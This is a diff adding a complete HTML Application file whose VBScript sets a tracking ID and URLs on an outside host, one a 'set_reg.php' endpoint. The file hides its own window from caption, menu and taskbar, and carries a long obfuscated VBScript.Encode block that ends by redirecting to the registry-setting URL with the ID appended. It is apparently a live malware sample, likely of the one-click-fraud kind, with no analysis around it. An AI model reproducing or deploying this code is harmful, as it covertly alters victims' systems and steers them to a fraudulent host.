@@ -1,0 +1,56 @@
+<html>
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=euc-jp">
+<Script Language="VBScript">
+Option Explicit
+Dim sr_url
+Dim no_url
+Dim CUID
+
+sr_url=""
+no_url=""
+
+CUID = "7882fa96d3b276cffe67fb3dd5c9deb78a759c6d8b61e00b"
+
+
+sr_url="http://incurable.cheezsmell.net/pc/set_reg.php?"
+no_url="http://incurable.cheezsmell.net/index.php"
+
+</script>
+<title>7882fa96d3b276cffe67fb3dd5c9deb78a759c6d8b61e00b</title>
+<Script Language="VBScript">
+
+window.resizeTo 600,400
+positionX = ( screen.availWidth - 600) / 2 - 100
+positionY = ( screen.availHeight - 400 ) / 2 - 50
+window.moveTo positionX, positionY
+
+</Script>
+</head>
+<body>
+<HTA:APPLICATION
+	BORDER = "none"
+	INNERBORDER = "no"
+	BORDERSTYLE = "normal"
+	CONTEXTMENU = "no"
+	SELECTION = "no"
+	SCROLL = "no"
+	SCROLLFLAT = "no"
+	CAPTION = "no"
+	ICON = ""
+	SYSMENU = "no"
+	MAXIMIZEBUTTON = "no"
+	MINIMIZEBUTTON = "no"
+	VERSION = "1.0"
+	APPLICATIONNAME = "cheez"
+	ID = "$cuid\"
+	SINGLEINSTANCE = "yes"
+	SHOWINTASKBAR = "no"
+	NAVIGABLE = "yes"
+	WINDOWSTATE = "normal"
+/>
+<script type="text/VBScript.Encode">
+#@~^KxAAAA==@#}wObW	P2Xw^rmbY@#@#@&rU~ADDK.P"+/!hnPg+XY@#@&@#@&&0~sms/PP4x@#@#@&E]1vu{(]12]Ov]R u^mu%0]9&Y1+]l8Y%y]mlY0 um1]04Ynm]1%xY%y]WTu, hYR Ym8YR Y1cu% ulyY%y]n,u,Tsu% u^Nu%FzY1vuG(]1!sYR YlOY%y]n{u% Y^9]0 u8(]0y]1m]R4unlu,09u%+Yml]R^]m,]R+Yl+]R YN^YR Y4OY%y]Wqu%F$YZNY!mYR4Ylu,%x]R+](*Y%y]8[u% u^vu%+7Y0 uly]0NY1]0 uWFu%+Y1*]0+ul+]R+u+1u,ZV]R u^Nu%qbu%8Yl]O09u% u8X]R u4[]0+u4q]R+]1vY0y]0TYO!s]R+um1u,y:]R u^Fu%+]1cY0y]+ZY%y]+FY0 uly]0 Y89]0 uCNu%+Y1c]0+u4X]R+ul1u%y]49]R+]m!Y%y]n0u% u[mu% u81]R u0q]0q~]TNuTlu![YZl]0nu%*]R+um^u,y:]R un,u%^]1!Y0y]+RY%8b]OYG(]O&Y,YR YmOY%(]nCu,%BYR Y0ZYO hu%y]m8]R+]1cY%y]C+u% un,u, sY0 u+R]0NY0F]0 uC u%+Y1N]0qz]0 u8F]0y]1+]R unGu%+](*Y0y]l9Y%2]G1Y0&q]R&n]0f~]0&!Y%8qYT9]!CYRlz]R+u4Xu%y]ly]O04u,q]%Y0y]+ZY,+S]OXa]R umX]0qz]0 uC u%+Y1F]0+u4X]R+u+Xu%y]mO]R+]m Y%y]^*u% un!u% uC+]R u++]0+uN[]R+]1%Y0y]l[YRF)]R+u4{u%y]m]R+]GY%y]8Xu% uC u,*uW8]R u4[]0+u4W]R+]1+Y0y]l1YR Y+RYR Y1*u% u4FY%8AY!9]TCu% u^*u% unT]RFz]1vY{(]1&u1vu%+Y1m]00uNf]Oulqu%y]ml]R8]lY,R9Y0y]0ZY,y:]R+Y+F]R Ym0YR YlyY,ZVY0y]m[YRF)]R8u+Cu,R9]R uW!u%^]64Y0y]mOY%6W]R+Y4l]RF)]0nul1]OX]mlY0y]m[YR Y48YR Y6Fu% umRY%y]^,u%8Yl]O09u% u8X]R u4[]0+um]R0]lY1Z]4YRmY,1YOvY(Nu,*u08Y%9]1!u%+Y(*]R+]9m]R+Y4F]RF$]T[u!C]Z[]ZlY0y]48YR Ym1YR%YFu% ulyY%y]^Nu%q)u% u84u% uC*]RFucT]1uG8]Of]OvY0y]m^YR4Y+mYO%Bu%y]0Z]O+:u%+]1FY0y]mWY%y]lyY0 u+O]1!sYR Ym9Y%8bY0y]48YR Ym1YR4Ylu,%x]R+]1mY%1]W^u% u8Fu% uC*]R um1]1Tj]0 u8*u%+Ym ]1*ul[]R^ul1u%y]0Z]R^]m,Y%y]^+u% uC0u%FzY0mu0l]04KYR YlyY%y]^*u% YCy]0 unO]0y]m,]R unGu%qAu![YZl]O]F4]OfY,+]R Ym^YR4Y+mY,R9Y0y]0TYO h]R+u+{u%y]mR]R+]m Y,ZVY0y]m9Y%8b]R8Y+m]O%B]0+um^]R^]6mY0y]4qYR YlWYR Y1,u%mu0lY%y]Clu%+Ym!]R+],]R+Y48]R YmYR Y4FY%y]n{u, hYR Y+FYR Y(%u%Fz]R8]lY,R9Y0y]4lY%y]mWY0 uly]0 YnO]0+uC,u,XYml]0+u0T]R0uN*u%y]N6]R+]1cY%y][1u% u8*u% uC[]R um0]0+u+1]RqAu![YZl]00uN*]R+uNWu%y]m1]R^](+Y,FYY0y]mOY,+]01Y0 u42]0 Ynm]0 u^cu%+Ym ]0+u+1]R+umu%m]lR]R0]FY%y]C+u% uW!u% u8X]R um*]0qz]04unlu,0Bu% YCO]0 unF]1W]( ]R uC0u%WWu%+Y(,]R+]1%]R+Yly]RF$]T[u!C]Z[]ZlY0]%*YR Ym9YR Ym u% umyY%y]n!u%n-u% uCcu%FzY1!^]R Ym^YO%8]R+]6!Y0y]+YR Yl9YO*Y(Gu% ul6Y%y]^cu%q)u%&HY%8]*(Y0&o]R Y+TYOGY,ZY%y]nCu% Y8R]0FzYR+Ym,u,*ulmY%y]^,u%^Y9v]R+]%]R+Y0Z]R+Y,[YR Y46Y%8bY0y]l+YR YmyYR Y!u,F}]R^]6mY%y]C8u% u^%u,GwY1!^]R Y0TYRmYlOY%y]n1u% Y^+]0FzYZNYZlu% ulZY%8]!u%8Yl]O09u% u8X]R u4[]0+u0q]R+](+Y0y]m0YF+Y%yY1FYR umcu!9Y!m]TNu!CYO!Vu0 umNu1q]6 u%nIY0y]^mu04u+CYO%9Y0y]^vu01]8]R ]mcu00K]1Gu%0YR+]O]R ]11Y,F]mGY%+Y(0Y%1Y01]0+ul,Y0y]^Fu0y]^W]R ]m u0 umq]R Y89]%yYm+]%yYC4u%8bY%1Y(NY%yYmO]0+u+!Y06]10u0y]nO]R+]m,u1*ulC]R YCm]%yY4(]%yY8Fu%y]^,Y06WY,FY%R]0Wu+&Y0y]Clu0y]^8]R ]1cu0 ul+]R YnO]%yYm1]%yY^*u%y]8GY08AY!9Y!m]1uG4Y1ZVY%yY1NYR4;]%y]mC]O*O]R YCO]%yYmR]%yYCNu%y]^cY0y]n!u0Fz]0^ul,Y0y]n,u1ZVYR ullu%yYN9]0 u4[YR ]{]R%]CY,+]9lY,{Y1cY,8]]R Y^R]%+Y1mY%yY1*YR u4Gu%8$]ZNY!m]T[u!lu1!^]%yY^,u%y]^GY0y]Ccu0 u4XYR ]^*u%+]Tu%8u0Z],y/u0 umq]R Y^W]%yY4l]%yY[mu%y]CcYT9]Tlu04u+CYO%9Y1R4Y%yY6!YR u4*u%yYmW]0 u4XYR ]9^]R ]m*Y!9]ZlY%+Y(4Y%yY08]0+um%Y1l]W4u0y]^9]RFbu%yYN1]0 u4nYR ]9^]R ](nY%6]vY%+Y%Y%O"]R YC+]%+Y,Y%yY9GYR ul4u%]]R Y0Z]0Wu+vu0 u+%u01yu%y]CvY0y]^cu0 ul+YR ]^0u%+]m+u%+um1]%y]1X]R Y4F]0q~]!9Y!m]!9YTlu%y]8NY0y]8+u0 ul+YR ]Cu%+]1u%+u48]%y]1]R Ym9]0qz]%yY4O]%yY^Fu%y]C,Y0y]CNu1&K]0+u+%Y0xY%yY90YR u4Nu%]]R Yml]0+u4Gu0 ul,u0+]Gu%qbY06]nvu0 u+0YR,yY0y]Cvu0y]^W]R ]mNu0 u4n]R Y82]%yYly]%8$Y!9]ZlY%+Y(4Y%yYm1]0^u0mY0y]8Fu0y]CW]R ]1,u0 um[]RF)YOv]F8]O&]OY%y]1mY%+Ym!Y%yYmR]0+u4NY0y]Clu01]Wl]R ]%u04h]0 ul+YR ]1*]R ]m+Y%y],Y%+Y1mY%yYml]0+u4GY08AY!9YZlYZNu!lu%yY4]0 umqYR ]1*]R+Iu0+]6!u,+:Y0y]nGu0 um0YR ]C+u,TVu0y]nZ]RFbu,8Y0y]0+"]0+ul u0 u+,u0+]1mu%+]^Xu%+]({]R Yn+]%q$u![]ZCu![u!m]%y]T]R Y4l]0+ul!u0 um%u0+](Nu%+]CCu%8]C]O%BYR ]8Xu%+]1*u%+u+O]%8bu0mu,1]R Y^R]%-]R ]m+Y%y]6!Y%+Y(*Y%yYmW]0+ul Y0y]n,u0y]^+]R+\u%yYm8]0 u4[YR ]{]RFbu0+]mlu%+]Wqu%+]1n]R Y^8]%+Y1cY%6YvYR u+%u%O"]R Yl+]0+umcu0 ulNu0+](+u%+]8fu%+]m+]RF$YZN]TCu%+](1u%+um8]%y]m1]R Yl9]0+ummu1&K]%]Y%y](vY%+YFY%yYmR]0+ul Y0y]^*u0y]8F]R ]m,u0F~]TNu!C@#@#@&2	[P&0@#@#@&(0,2MD 1;h(+.P{~!,K4n	@#@&7(6P/j&9{JE,K4+x@#@&i7SKmCYbWU _D+6~',xW|;.V@#@&i2s/n@#@&d7SK^lDkGUcCDnW,'~/Mm!Ds,[,J[1Eb['rP'P;j(9@#@&dAUN,q0@#@&3Vk+@#@&7SG^mYrW	 CM+W~{PxGm!Ds@#@&3	N~&0@#@&37YDAA==^#~@
+</script>
+</body>
+</html>
